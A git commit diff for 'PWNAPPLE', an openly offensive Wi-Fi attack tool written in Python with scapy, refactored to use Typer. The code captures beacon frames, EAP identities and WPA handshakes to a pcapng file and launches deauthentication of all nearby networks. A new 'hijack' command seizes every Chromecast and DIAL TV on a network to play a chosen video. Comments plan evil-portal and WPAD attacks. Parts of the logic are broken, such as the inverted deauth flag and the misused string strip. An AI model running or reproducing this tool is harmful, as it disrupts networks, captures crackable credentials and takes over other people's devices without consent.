a62ad79db1b3572211cc6979f3a3dbc1a3d324fe
Mater <88980654+Mater8600@users.noreply.github.com>
2026-02-14 22:43:16 -0400

    Refactor CLI to use Typer and update deauth logic

--- main.py
+++ main.py
@@ -1,34 +1,40 @@
 from scapy.all import *
 from scapy.utils import PcapNgWriter
 import threading
-import argparse
 import os
 from rich import print
-
+import typer 
+from typing import Annotated
+import pychromecast
+import zeroconf
+import re
+from pylaunch.dial import Dial
+from pychromecast.controllers.youtube import YouTubeController
 # You will have to redo the logic here, since you don't need to sniff all packets 24/7 in mointer mode. #
 
-parser = argparse.ArgumentParser(prog="PWNAPPLE",description="PWNAPPLE'S CLI for a variety of attacks, you need 2 adapters for this to work well")
-parser.add_argument("-t", "--timeout", help="The delay in seconds before switching channels",default=3,type=int)
-parser.add_argument("-o", "--output", help="The name of the file you want to output to", required=True,type=str)
-parser.add_argument("-i", "--interface", help="The interface you want to use", required=True) # Auto sets into mointer mode!
-parser.add_argument("-d", "--deauth", help="If passed the with a interface, it will deauth all networks (BE CAREFUL!)")
+
+# parser = argparse.ArgumentParser(prog="PWNAPPLE",description="PWNAPPLE'S CLI for a variety of attacks, you need 2 adapters for this to work well")
+# parser.add_argument("-t", "--timeout", help="The delay in seconds before switching channels",default=3,type=int)
+# parser.add_argument("-o", "--output", help="The name of the file you want to output to", required=True,type=str)
+# parser.add_argument("-i", "--interface", help="The interface you want to use", required=True) # Auto sets into mointer mode!
+# parser.add_argument("-d", "--deauth", help="If passed the with a interface, it will deauth all networks (BE CAREFUL!)")
 # Something to note, we should have a sniffer for traffic on the network pwnapple connects to.
 # if the -s function is True, then we sniff EAPOL, but if it's false we should have it do it's other tasks
 # this is pwnapple's cli, think of it as a starting point for all the functions pwnapple will eventually have on the webui
+### REDOING WITH TYPER ###
+app = typer.Typer()
 
 
-args = parser.parse_args()
-# I know global vars are dumb, but it's quicker 
-interface = args.interface
-interfaceDeauth = args.deauth
-dump = PcapNgWriter(f"{args.output}.pcapng") 
+# I know global vars are dumb, but it's quicker  #
+
+
 ssids = []
 bssids = []
 macAddresses = []
 totalSSIDS = []
 totalBSSIDS = []
 totalmacAddresses = []
-def deauth():
+def deauthNetworks():
     print("[bold red]Will start to deauth when targets availible[/bold red]")
     while True:
         try:
@@ -52,29 +58,17 @@ def cleanList():
         bssids.clear()
         macAddresses.clear()
 
-def PacketHandler(pkt):
-    """Handles all the packet functions for the sniffer"""
-    if pkt.haslayer(Dot11): 
-        if pkt.type == 0 and pkt.subtype == 8:
-            if pkt.addr2 not in bssids:
-                ssids.append(pkt.info)
-                bssids.append(pkt.addr2)
-                macAddresses.append(pkt.addr3)
-                if pkt.addr2 not in totalBSSIDS:
-                    print(f"[dim cyan][Info]: Beacon frame found: SSID: {pkt.info}, BSSID: {pkt.addr2}, MAC: {pkt.addr3}[/dim cyan]")
-                    totalSSIDS.append(pkt.info)
-                    totalBSSIDS.append(pkt.addr2)
-                    totalmacAddresses.append(pkt.addr3)
-                
-            dump.write(pkt)
-            if pkt.haslayer(EAP) and pkt.code == 2 and pkt.type == 1:
-                identity = pkt.identity.decode(errors="ignore")
-                print(f"[bold green][Info]: EAP Identity Found: {identity}[/bold green]")
-                dump.write(pkt)
-
-        if pkt.haslayer(EAPOL):
-            print(f"[bold green][Info]: Handshake captured: {pkt.summary()}[/bold green]")
-            dump.write(pkt)
+print(
+    """[bold green]                                                        
+██████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░██████╗░██████╗░██╗░░░░░███████╗
+██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔════╝
+██████╔╝░╚██╗████╗██╔╝██╔██╗██║███████║██████╔╝██████╔╝██║░░░░░█████╗░░
+██╔═══╝░░░████╔═████║░██║╚████║██╔══██║██╔═══╝░██╔═══╝░██║░░░░░██╔══╝░░
+██║░░░░░░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║██║░░░░░██║░░░░░███████╗███████╗
+╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚══════╝ [bold red]by mater8600[/bold red]
+[/bold green]
+"""
+)
     
 
 def channelHop():
@@ -106,14 +100,84 @@ def changeHotspot(hotspotname, hotspotpassword):
         os.system("nmcli ")
 def createPortal():
     """creates a hotspot for the evil portal attacks, NOT IMPLEMENTED!"""
-def sniffEapol():
+def sniffEapol(interface,deauth,output):
     threading.Thread(target=channelHop).start()
     setupAdapter(interface=interface)
-    if interfaceDeauth != None:
+    if deauth == False:
         threading.Thread(target=deauth).start()
         threading.Thread(target=cleanList).start()
-    sniff(iface=f"{interface}mon",prn=PacketHandler,store=False,monitor=True)
+    dump = PcapNgWriter(f"{output}.pcapng") 
+    def PacketHandler(pkt):
+        """Handles all the packet functions for the sniffer"""
+        
+        if pkt.haslayer(Dot11): 
+            if pkt.type == 0 and pkt.subtype == 8:
+                if pkt.addr2 not in bssids:
+                    ssids.append(pkt.info)
+                    bssids.append(pkt.addr2)
+                    macAddresses.append(pkt.addr3)
+                    if pkt.addr2 not in totalBSSIDS:
+                        print(f"[dim cyan][Info]: Beacon frame found: SSID: {pkt.info}, BSSID: {pkt.addr2}, MAC: {pkt.addr3}[/dim cyan]")
+                        totalSSIDS.append(pkt.info)
+                        totalBSSIDS.append(pkt.addr2)
+                        totalmacAddresses.append(pkt.addr3)
+                    
+                dump.write(pkt)
+                if pkt.haslayer(EAP) and pkt.code == 2 and pkt.type == 1:
+                    identity = pkt.identity.decode(errors="ignore")
+                    print(f"[bold green][Info]: EAP Identity Found: {identity}[/bold green]")
+                    dump.write(pkt)
 
+            if pkt.haslayer(EAPOL):
+                print(f"[bold green][Info]: Handshake captured: {pkt.summary()}[/bold green]")
+                dump.write(pkt)
+    sniff(iface=interface,prn=PacketHandler,store=False,monitor=True)
+
+# Typer commands 
+### 
+@app.command(help="Sniff in mointer mode")
+def sniffEAPOL(
+    interface: str,
+    output: Annotated[str,typer.Argument(help="file to output to. (No need for filename!) default =output")] = "output",
+    deauth: Annotated[bool,typer.Argument(help="pass if need autodeauth")]= False,
+            ):
+    sniffEapol(interface,deauth,output)
+    #
+
+@app.command(name="hijack")
+def hijack(
+    url: Annotated[str,typer.Argument(help="The url to broadcast default is rickroll")] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+):
+     
+     """Hijack all chromecasts on a network and DIAL TVS and play a video of your choice"""
+     print(f"[dim cyan][Info]: Hjacking all the chromecasts with the url: {url}[/dim cyan]")
+     d = Dial.discover()
+     videoID = url.strip("https://www.youtube.com/watch?v=")
+     for device in d:
+        try:
+            device.launch_app('YouTube', v=videoID)
+        except Exception as error:
+            print(error)
+    
+     zconf = zeroconf.Zeroconf()
+     browser = pychromecast.CastBrowser(listener, zconf)
+     browser.start_discovery()
+     time.sleep(2)
+     pychromecast.discovery.stop_discovery(browser)
+
+     for uuid, info in browser.devices.items():
+            print(f"[dim cyan][info]: UUID: {uuid}, Friendly Name: {info.friendly_name}[/dim cyan]")
+            chromecasts, browser2 = pychromecast.get_listed_chromecasts(uuids={uuid})
+            if chromecasts:
+                cast = chromecasts[0]
+                cast.wait()
+                yt = YouTubeController()
+                cast.register_handler(yt)
+                yt.play_video(video_id=videoID)
+                browser2.stop_discovery()
+
+        
+app()
 # TODO 
 # ADD TYPER OR ARGSPARSE  done
 # MAKE THIS A COMMAND, NOT JUST A FUNCTION done
@@ -126,7 +190,4 @@ def sniffEapol():
 # WPAD  abuse  -- evil portal first (inspired by: https://github.com/7h30th3r0n3/Evil-M5Project/wiki/wpad-abuse)
 # Handshake Conversion
 # responder 
-
-
-sniffEapol()
 
